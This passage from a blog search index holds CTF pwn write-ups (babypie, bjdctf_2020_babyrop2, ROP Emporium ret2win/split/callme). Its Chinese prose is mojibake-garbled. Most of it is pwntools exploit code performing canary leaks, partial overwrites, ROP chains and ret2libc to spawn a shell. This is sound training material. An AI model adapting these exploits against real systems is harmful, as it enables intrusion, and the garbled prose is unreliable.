harder: &lt;a href=&#34;https://ha2der.github.io/&#34;&gt;https://ha2der.github.io/&lt;/a&gt;&lt;br&gt;
d3f4u1t: &lt;a href=&#34;https://superfengi.github.io/&#34;&gt;https://superfengi.github.io/&lt;/a&gt;&lt;/p&gt;
">å‹é“¾</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LZZf9NPoM/"" data-c="
          &lt;p&gt;æ­¤é¢˜64ä½å¼€å¯nxï¼Œcanaryï¼Œpieä¿æŠ¤ï¼Œæœ‰backdoorå‡½æ•°sub_A3E&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362822117.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŸ¥çœ‹ä¸»å‡½æ•°ï¼Œå‘ç°æ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ³„éœ²canaryåªå¥½ç”¨åˆ°åç§»ï¼ˆ0x30-0x8=0x28&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362855893.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ³„éœ²canary&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362902193.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­¤æ—¶ä¸å¥½æ³„éœ²ç¨‹åºåŸºå€ï¼Œæ•…è€ƒè™‘å‡½æ•°ç›´æ¥åç§»æ¥è·å–,å¯ä»¥çœ‹å‡ºè¿”å›åœ°å€ä½ä½ä¸º&lt;code&gt;0a&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676363098325.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œåé—¨å‡½æ•°ä½ä½&lt;code&gt;3e&lt;/code&gt;ï¼Œåˆ™è€ƒè™‘è¦†ç›–è¿”å›åœ°å€ä½ä½æ¥è·å–shellï¼Œåˆ™åªéœ€ä¿®æ”¹1ä¸ªå­—èŠ‚ï¼Œå¯ä»¥ç”¨&lt;code&gt;p8()&lt;/code&gt;ä¿®æ”¹8bitçš„å†…å®¹ä¹Ÿå¯ä»¥ç›´æ¥å‘é€&lt;code&gt;\x3e&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676363166788.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ•…expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./babypie&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26395)

# gdb.attach(io)
# pause()

io.recvuntil(&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28
io.sendline(payload)
io.recvuntil(b&amp;quot;\n&amp;quot;)
# io.recvuntil(b&amp;quot;:\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+b&amp;quot;\x3e&amp;quot;
io.sendline(payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦å¤–è¿˜å¯ä»¥çˆ†ç ´è¿™8bit&lt;br&gt;
çˆ†ç ´è„šæœ¬ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;

char a[16]={&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;};


signed main()
{
    for(int i=0;i&amp;lt;16;i++)
    { 
        for(int j=0;j&amp;lt;16;j++)
        {
            cout&amp;lt;&amp;lt;&amp;quot;b&amp;quot;&amp;lt;&amp;lt;char(34)&amp;lt;&amp;lt;char(92)&amp;lt;&amp;lt;&amp;quot;x&amp;quot;&amp;lt;&amp;lt;a[i]&amp;lt;&amp;lt;a[j]&amp;lt;&amp;lt;char(34)&amp;lt;&amp;lt;&amp;quot;,&amp;quot;;
            // printf(&amp;quot;b&#39;%c%c&#39;,&amp;quot;,a[i],a[j]);
        }
    }


    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1676553162361.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
çˆ†ç ´expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

list1=[b&amp;quot;\x00&amp;quot;,b&amp;quot;\x01&amp;quot;,b&amp;quot;\x02&amp;quot;,b&amp;quot;\x03&amp;quot;,b&amp;quot;\x04&amp;quot;,b&amp;quot;\x05&amp;quot;,b&amp;quot;\x06&amp;quot;,b&amp;quot;\x07&amp;quot;,b&amp;quot;\x08&amp;quot;,b&amp;quot;\x09&amp;quot;,b&amp;quot;\x0a&amp;quot;,b&amp;quot;\x0b&amp;quot;,b&amp;quot;\x0c&amp;quot;,b&amp;quot;\x0d&amp;quot;,b&amp;quot;\x0e&amp;quot;,b&amp;quot;\x0f&amp;quot;,b&amp;quot;\x10&amp;quot;,b&amp;quot;\x11&amp;quot;,b&amp;quot;\x12&amp;quot;,b&amp;quot;\x13&amp;quot;,b&amp;quot;\x14&amp;quot;,b&amp;quot;\x15&amp;quot;,b&amp;quot;\x16&amp;quot;,b&amp;quot;\x17&amp;quot;,b&amp;quot;\x18&amp;quot;,b&amp;quot;\x19&amp;quot;,b&amp;quot;\x1a&amp;quot;,b&amp;quot;\x1b&amp;quot;,b&amp;quot;\x1c&amp;quot;,b&amp;quot;\x1d&amp;quot;,b&amp;quot;\x1e&amp;quot;,b&amp;quot;\x1f&amp;quot;,b&amp;quot;\x20&amp;quot;,b&amp;quot;\x21&amp;quot;,b&amp;quot;\x22&amp;quot;,b&amp;quot;\x23&amp;quot;,b&amp;quot;\x24&amp;quot;,b&amp;quot;\x25&amp;quot;,b&amp;quot;\x26&amp;quot;,b&amp;quot;\x27&amp;quot;,b&amp;quot;\x28&amp;quot;,b&amp;quot;\x29&amp;quot;,b&amp;quot;\x2a&amp;quot;,b&amp;quot;\x2b&amp;quot;,b&amp;quot;\x2c&amp;quot;,b&amp;quot;\x2d&amp;quot;,b&amp;quot;\x2e&amp;quot;,b&amp;quot;\x2f&amp;quot;,b&amp;quot;\x30&amp;quot;,b&amp;quot;\x31&amp;quot;,b&amp;quot;\x32&amp;quot;,b&amp;quot;\x33&amp;quot;,b&amp;quot;\x34&amp;quot;,b&amp;quot;\x35&amp;quot;,b&amp;quot;\x36&amp;quot;,b&amp;quot;\x37&amp;quot;,b&amp;quot;\x38&amp;quot;,b&amp;quot;\x39&amp;quot;,b&amp;quot;\x3a&amp;quot;,b&amp;quot;\x3b&amp;quot;,b&amp;quot;\x3c&amp;quot;,b&amp;quot;\x3d&amp;quot;,b&amp;quot;\x3e&amp;quot;,b&amp;quot;\x3f&amp;quot;,b&amp;quot;\x40&amp;quot;,b&amp;quot;\x41&amp;quot;,b&amp;quot;\x42&amp;quot;,b&amp;quot;\x43&amp;quot;,b&amp;quot;\x44&amp;quot;,b&amp;quot;\x45&amp;quot;,b&amp;quot;\x46&amp;quot;,b&amp;quot;\x47&amp;quot;,b&amp;quot;\x48&amp;quot;,b&amp;quot;\x49&amp;quot;,b&amp;quot;\x4a&amp;quot;,b&amp;quot;\x4b&amp;quot;,b&amp;quot;\x4c&amp;quot;,b&amp;quot;\x4d&amp;quot;,b&amp;quot;\x4e&amp;quot;,b&amp;quot;\x4f&amp;quot;,b&amp;quot;\x50&amp;quot;,b&amp;quot;\x51&amp;quot;,b&amp;quot;\x52&amp;quot;,b&amp;quot;\x53&amp;quot;,b&amp;quot;\x54&amp;quot;,b&amp;quot;\x55&amp;quot;,b&amp;quot;\x56&amp;quot;,b&amp;quot;\x57&amp;quot;,b&amp;quot;\x58&amp;quot;,b&amp;quot;\x59&amp;quot;,b&amp;quot;\x5a&amp;quot;,b&amp;quot;\x5b&amp;quot;,b&amp;quot;\x5c&amp;quot;,b&amp;quot;\x5d&amp;quot;,b&amp;quot;\x5e&amp;quot;,b&amp;quot;\x5f&amp;quot;,b&amp;quot;\x60&amp;quot;,b&amp;quot;\x61&amp;quot;,b&amp;quot;\x62&amp;quot;,b&amp;quot;\x63&amp;quot;,b&amp;quot;\x64&amp;quot;,b&amp;quot;\x65&amp;quot;,b&amp;quot;\x66&amp;quot;,b&amp;quot;\x67&amp;quot;,b&amp;quot;\x68&amp;quot;,b&amp;quot;\x69&amp;quot;,b&amp;quot;\x6a&amp;quot;,b&amp;quot;\x6b&amp;quot;,b&amp;quot;\x6c&amp;quot;,b&amp;quot;\x6d&amp;quot;,b&amp;quot;\x6e&amp;quot;,b&amp;quot;\x6f&amp;quot;,b&amp;quot;\x70&amp;quot;,b&amp;quot;\x71&amp;quot;,b&amp;quot;\x72&amp;quot;,b&amp;quot;\x73&amp;quot;,b&amp;quot;\x74&amp;quot;,b&amp;quot;\x75&amp;quot;,b&amp;quot;\x76&amp;quot;,b&amp;quot;\x77&amp;quot;,b&amp;quot;\x78&amp;quot;,b&amp;quot;\x79&amp;quot;,b&amp;quot;\x7a&amp;quot;,b&amp;quot;\x7b&amp;quot;,b&amp;quot;\x7c&amp;quot;,b&amp;quot;\x7d&amp;quot;,b&amp;quot;\x7e&amp;quot;,b&amp;quot;\x7f&amp;quot;,b&amp;quot;\x80&amp;quot;,b&amp;quot;\x81&amp;quot;,b&amp;quot;\x82&amp;quot;,b&amp;quot;\x83&amp;quot;,b&amp;quot;\x84&amp;quot;,b&amp;quot;\x85&amp;quot;,b&amp;quot;\x86&amp;quot;,b&amp;quot;\x87&amp;quot;,b&amp;quot;\x88&amp;quot;,b&amp;quot;\x89&amp;quot;,b&amp;quot;\x8a&amp;quot;,b&amp;quot;\x8b&amp;quot;,b&amp;quot;\x8c&amp;quot;,b&amp;quot;\x8d&amp;quot;,b&amp;quot;\x8e&amp;quot;,b&amp;quot;\x8f&amp;quot;,b&amp;quot;\x90&amp;quot;,b&amp;quot;\x91&amp;quot;,b&amp;quot;\x92&amp;quot;,b&amp;quot;\x93&amp;quot;,b&amp;quot;\x94&amp;quot;,b&amp;quot;\x95&amp;quot;,b&amp;quot;\x96&amp;quot;,b&amp;quot;\x97&amp;quot;,b&amp;quot;\x98&amp;quot;,b&amp;quot;\x99&amp;quot;,b&amp;quot;\x9a&amp;quot;,b&amp;quot;\x9b&amp;quot;,b&amp;quot;\x9c&amp;quot;,b&amp;quot;\x9d&amp;quot;,b&amp;quot;\x9e&amp;quot;,b&amp;quot;\x9f&amp;quot;,b&amp;quot;\xa0&amp;quot;,b&amp;quot;\xa1&amp;quot;,b&amp;quot;\xa2&amp;quot;,b&amp;quot;\xa3&amp;quot;,b&amp;quot;\xa4&amp;quot;,b&amp;quot;\xa5&amp;quot;,b&amp;quot;\xa6&amp;quot;,b&amp;quot;\xa7&amp;quot;,b&amp;quot;\xa8&amp;quot;,b&amp;quot;\xa9&amp;quot;,b&amp;quot;\xaa&amp;quot;,b&amp;quot;\xab&amp;quot;,b&amp;quot;\xac&amp;quot;,b&amp;quot;\xad&amp;quot;,b&amp;quot;\xae&amp;quot;,b&amp;quot;\xaf&amp;quot;,b&amp;quot;\xb0&amp;quot;,b&amp;quot;\xb1&amp;quot;,b&amp;quot;\xb2&amp;quot;,b&amp;quot;\xb3&amp;quot;,b&amp;quot;\xb4&amp;quot;,b&amp;quot;\xb5&amp;quot;,b&amp;quot;\xb6&amp;quot;,b&amp;quot;\xb7&amp;quot;,b&amp;quot;\xb8&amp;quot;,b&amp;quot;\xb9&amp;quot;,b&amp;quot;\xba&amp;quot;,b&amp;quot;\xbb&amp;quot;,b&amp;quot;\xbc&amp;quot;,b&amp;quot;\xbd&amp;quot;,b&amp;quot;\xbe&amp;quot;,b&amp;quot;\xbf&amp;quot;,b&amp;quot;\xc0&amp;quot;,b&amp;quot;\xc1&amp;quot;,b&amp;quot;\xc2&amp;quot;,b&amp;quot;\xc3&amp;quot;,b&amp;quot;\xc4&amp;quot;,b&amp;quot;\xc5&amp;quot;,b&amp;quot;\xc6&amp;quot;,b&amp;quot;\xc7&amp;quot;,b&amp;quot;\xc8&amp;quot;,b&amp;quot;\xc9&amp;quot;,b&amp;quot;\xca&amp;quot;,b&amp;quot;\xcb&amp;quot;,b&amp;quot;\xcc&amp;quot;,b&amp;quot;\xcd&amp;quot;,b&amp;quot;\xce&amp;quot;,b&amp;quot;\xcf&amp;quot;,b&amp;quot;\xd0&amp;quot;,b&amp;quot;\xd1&amp;quot;,b&amp;quot;\xd2&amp;quot;,b&amp;quot;\xd3&amp;quot;,b&amp;quot;\xd4&amp;quot;,b&amp;quot;\xd5&amp;quot;,b&amp;quot;\xd6&amp;quot;,b&amp;quot;\xd7&amp;quot;,b&amp;quot;\xd8&amp;quot;,b&amp;quot;\xd9&amp;quot;,b&amp;quot;\xda&amp;quot;,b&amp;quot;\xdb&amp;quot;,b&amp;quot;\xdc&amp;quot;,b&amp;quot;\xdd&amp;quot;,b&amp;quot;\xde&amp;quot;,b&amp;quot;\xdf&amp;quot;,b&amp;quot;\xe0&amp;quot;,b&amp;quot;\xe1&amp;quot;,b&amp;quot;\xe2&amp;quot;,b&amp;quot;\xe3&amp;quot;,b&amp;quot;\xe4&amp;quot;,b&amp;quot;\xe5&amp;quot;,b&amp;quot;\xe6&amp;quot;,b&amp;quot;\xe7&amp;quot;,b&amp;quot;\xe8&amp;quot;,b&amp;quot;\xe9&amp;quot;,b&amp;quot;\xea&amp;quot;,b&amp;quot;\xeb&amp;quot;,b&amp;quot;\xec&amp;quot;,b&amp;quot;\xed&amp;quot;,b&amp;quot;\xee&amp;quot;,b&amp;quot;\xef&amp;quot;,b&amp;quot;\xf0&amp;quot;,b&amp;quot;\xf1&amp;quot;,b&amp;quot;\xf2&amp;quot;,b&amp;quot;\xf3&amp;quot;,b&amp;quot;\xf4&amp;quot;,b&amp;quot;\xf5&amp;quot;,b&amp;quot;\xf6&amp;quot;,b&amp;quot;\xf7&amp;quot;,b&amp;quot;\xf8&amp;quot;,b&amp;quot;\xf9&amp;quot;,b&amp;quot;\xfa&amp;quot;,b&amp;quot;\xfb&amp;quot;,b&amp;quot;\xfc&amp;quot;,b&amp;quot;\xfd&amp;quot;,b&amp;quot;\xfe&amp;quot;,b&amp;quot;\xff&amp;quot;]

num=0

while True:
    try:
        io=process(&amp;quot;./babypie&amp;quot;)
        # io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26395)

        # gdb.attach(io)
        # pause()

        io.recvuntil(&amp;quot;Name:\n&amp;quot;)
        payload=b&amp;quot;a&amp;quot;*0x28
        io.sendline(payload)
        io.recvuntil(b&amp;quot;\n&amp;quot;)
        # io.recvuntil(b&amp;quot;:\n&amp;quot;)
        canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
        print(&amp;quot;canary  &amp;quot;+hex(canary))

        io.recvuntil(b&amp;quot;\n&amp;quot;)
        payload=cyclic(0x28)+p64(canary)+p64(0)+list1[num]
        num+=1
        io.sendline(payload)


        io.interactive()
    except :
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">linkctf_2018.7_babypie wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9myo-1kzB/"" data-c="
          &lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1675758245230.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æœ¬é¢˜64ä½å¼€å¯nxå’Œcanaryä¿æŠ¤&lt;br&gt;
stringsé‡Œé¢å¹¶æœªæ‰¾åˆ°&lt;code&gt;system&lt;/code&gt;æˆ–è€…&lt;code&gt;/bin/sh&lt;/code&gt;ç­‰ç­‰ï¼Œè€ŒåŠ ä¸Šinitå‡½æ•°ä¸­çš„æç¤º&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758439196.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥ä»ret2libcæ–¹å‘å…¥æ‰‹ï¼Œè€Œ&lt;code&gt;gift&lt;/code&gt;å‡½æ•°ä¸­å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å°†canaryæ‰“å°å‡ºæ¥&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758508883.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é¦–å…ˆç¡®å®šcanaryè·ç¦»bufä½ç½®ä¸º0x20-0x8=0x18 #padding&lt;br&gt;
canaryå€¼ä¹Ÿåœ¨&lt;code&gt;rbp-8&lt;/code&gt;å¤„&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758691630.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
äºæ˜¯pwndbgé‡Œé¢åœ¨printfå¤„ä¸‹æ–­ç‚¹ï¼Œä½¿ç”¨pwngdbè‡ªå¸¦fmtargæµ‹ç®—åç§»é‡&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758635253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ¥ç€è·å–canaryå€¼ï¼›&lt;br&gt;
ç”±äºé¢˜ç›®æœªç»™å‡ºlibcç‰ˆæœ¬ï¼Œæ‰€ä»¥éœ€è¦è¿æ¥è¿œç«¯è·å–&lt;br&gt;
å¯ä»¥ä½¿ç”¨putsæ¥æ‰“å°leak_addr&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758875479.png&#34; alt=&#34;è¿™æ˜¯readå‡½æ•°&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å–æœ«ä¸‰ä½æ”¾å…¥libc databaseå¯»æ‰¾&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758972241.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¹‹ååœ¨glibc-all-in-oneä¸­å¯»æ‰¾å¯¹åº”ç‰ˆæœ¬ld.soæ–‡ä»¶ï¼Œå†åˆ©ç”¨patchelfæ›´æ¢(å¯ä»¥çœç•¥)&lt;br&gt;
å‰©ä¸‹çš„å°±æ˜¯åŸºæœ¬ret2libcæ“ä½œäº†&lt;br&gt;
expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./bjdctf_2020_babyrop2&amp;quot;)
elf=ELF(&amp;quot;./bjdctf_2020_babyrop2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26687)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
read_got=elf.got[b&amp;quot;read&amp;quot;]
pop_rdi_ret=0x400993


payload=b&amp;quot;%7$p&amp;quot;
io.recvuntil(b&amp;quot;u!\n&amp;quot;)
io.sendline(payload)
canary=int(io.recv(18),16)
print(&amp;quot;canary  &amp;quot;+hex(canary))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[b&amp;quot;_start&amp;quot;])
io.recvuntil(b&amp;quot;!\n&amp;quot;)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr  &amp;quot;+hex(leak_addr))
base_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
bin_addr=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)
io.recvuntil(b&amp;quot;u!\n&amp;quot;)
io.sendline(b&amp;quot;aa&amp;quot;)
io.recvuntil(b&amp;quot;!\n&amp;quot;)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400763 : mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x0000000000400762 : pop rbp ; mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400700 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005f9 : ret

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">bjdctf_2020_babyrop2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/p748X9SdF/"" data-c="
          &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ret2win&lt;/strong&gt;&lt;br&gt;
checksecä¸€ä¸‹&lt;img src=&#34;https://oraclepi.tech/post-images/1672434958813.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdbè°ƒè¯•ä¸€ä¸‹æµ‹ç®—æº¢å‡ºé•¿åº¦&lt;img src=&#34;https://oraclepi.tech/post-images/1672435551271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¸¢è¿›idaå‘ç°ret2winå‡½æ•°&lt;img src=&#34;https://oraclepi.tech/post-images/1672435377820.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¼–å†™expå³å¯æ‰“é€šå¾—åˆ°ROPE{a_placeholder_32byte_flag!}ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

io=process(&#39;./ret2win&#39;)
payload=cyclic(0x28)+p64(0x400756)
io.recv()
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;split&lt;/strong&gt;&lt;br&gt;
checksecä¸ä¸Šé¢˜åŒï¼Œ64ä½å°ç«¯åºï¼›&lt;br&gt;
gdbæµ‹å‡ºæº¢å‡ºé•¿åº¦ä¸º0x20+0x8&lt;img src=&#34;https://oraclepi.tech/post-images/1672595479702.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æœ¬é¢˜æ— ç›´æ¥å¯åˆ©ç”¨å‡½æ•°ï¼Œè€ƒè™‘æ„é€ ï¼Œç”±äºå­˜åœ¨&lt;code&gt;system()&lt;/code&gt;å‡½æ•°ï¼Œæ‰€ä»¥åªéœ€è¦&lt;code&gt;/bin/cat flag.txt  &lt;/code&gt;ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°ï¼Œæœ¬é¢˜ä¸º64ä½ç¨‹åºï¼Œåˆ™éœ€è€ƒè™‘64ä½ä¼ å‚é—®é¢˜ï¼Œx64ä¸­çš„å‰å…­ä¸ªå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨RDIï¼ŒRSIï¼ŒRDXï¼ŒRCXï¼ŒR8å’Œ R9ä¸­ï¼Œåˆ™éœ€è¦&lt;code&gt;pop rdi ; ret;&lt;/code&gt;&lt;br&gt;
ä½¿ç”¨&lt;code&gt;ROPgadget --binary split --only &amp;quot;pop|ret&amp;quot;&lt;/code&gt;æŸ¥æ‰¾æ‰€éœ€gadgets&lt;img src=&#34;https://oraclepi.tech/post-images/1672595935548.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¼–å†™expå³å¯æ‰“é€šå¾—åˆ°ROPE{a_placeholder_32byte_flag!}ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

elf=ELF(&#39;./split&#39;)
io=process(&#39;./split&#39;)
bin_addr=next(elf.search(b&#39;/bin/cat flag.txt&#39;))
sys_addr=elf.plt[&amp;quot;system&amp;quot;]
rdi_addr=0x4007c3
payload=cyclic(0x28)+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)
io.recv()
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;callme&lt;/strong&gt;&lt;br&gt;
è¿™é“é¢˜ä¿æŠ¤æªæ–½åŒä¸Šï¼Œä½†æ˜¯æ ¹æ®è¿™é“é¢˜çš„æ³¨æ„äº‹é¡¹éœ€è¦æŒ‰é¡ºåºåˆ†åˆ«è°ƒç”¨3ä¸ªå‡½æ•°ï¼Œä¸”éœ€è¦å¡«å…¥æŒ‡å®šå‚æ•°&lt;img src=&#34;https://oraclepi.tech/post-images/1673205618701.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åˆ™æ ¹æ®64ä½ç¨‹åºä¼ å‚ï¼Œå‰å…­ä¸ªå‚æ•°æ˜¯æŒ‰ä»å·¦åˆ°å³é¡ºåºä¼ å…¥å¯„å­˜å™¨ï¼Œåé¢çš„æŒ‰ç…§ä»å³åˆ°å·¦çš„é¡ºåºå‹å…¥æ ˆä¸­ï¼Œåˆ™æ­¤é¢˜ä¼ å‚æ—¶&lt;code&gt;call_xxx&lt;/code&gt;å‡½æ•°ä»å·¦åˆ°å³å³å¯&lt;br&gt;
æµ‹å‡ºæº¢å‡ºé•¿åº¦0x28ï¼ŒåŒç†å¯»æ‰¾gadgetï¼Œåˆ†åˆ«æ˜¯&lt;code&gt;pop_rdi_ret&lt;/code&gt;å’Œ&lt;code&gt;pop_rsi_rdx_ret&lt;/code&gt;ï¼Œç„¶åå‹å…¥å¯¹åº”3ä¸ªå‚æ•°&lt;img src=&#34;https://oraclepi.tech/post-images/1673205862488.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¼–å†™expæœ€å¼€å§‹å‡ºé”™&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673206062831.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è°ƒè¯•ä¸€æ³¢å‘ç°æ˜¯exp&lt;code&gt;flat()&lt;/code&gt;é‡Œé¢çš„å‚æ•°0x***å‰åŠ äº†&lt;code&gt;b&#39;&#39;&lt;/code&gt;ä½¿ç”¨äº†å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œè€Œflatæœ¬èº«æœ€åå°±æ˜¯è½¬æ¢ä¸ºbytesï¼Œåˆ™ä¸éœ€è¦åŠ &lt;code&gt;b&#39;&#39;&lt;/code&gt;ï¼Œå®Œæ•´expå¦‚ä¸‹&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

context.log_level = &#39;debug&#39;
context.arch=&#39;amd64&#39;
context.os=&#39;linux&#39;
context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

elf=ELF(&amp;quot;./callme&amp;quot;)
io=process(&amp;quot;./callme&amp;quot;)
rdi_ret_addr=0x4009a3
rsi_rdx_ret_addr=0x40093d
call1_addr=elf.symbols[&amp;quot;callme_one&amp;quot;]
call2_addr=elf.symbols[&amp;quot;callme_two&amp;quot;]
call3_addr=elf.symbols[&amp;quot;callme_three&amp;quot;]
#1
payload=cyclic(0x28)+flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call1_addr)
#2
payload += flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call2_addr)
#3
payload += flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call3_addr)
